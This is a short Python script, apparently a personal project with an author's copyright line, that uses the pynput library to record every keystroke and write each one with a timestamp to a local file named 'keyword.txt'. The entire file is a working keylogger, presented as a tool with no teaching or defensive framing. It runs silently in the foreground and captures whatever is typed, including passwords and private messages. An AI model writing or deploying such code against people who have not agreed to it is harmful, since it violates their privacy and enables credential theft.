#copyright of this code Eng.Abdirizak abdullahi hussein 

import pynput
from pynput import keyboard, mouse

from pynput.keyboard import Key , Listener

import logging

logging.basicConfig(filename='keyword.txt', level=logging.DEBUG, format='%(asctime)s - %(message)s')

def on_press(key):
    logging.info(str(key))

with Listener (on_press=on_press) as Listener:
    Listener.join()
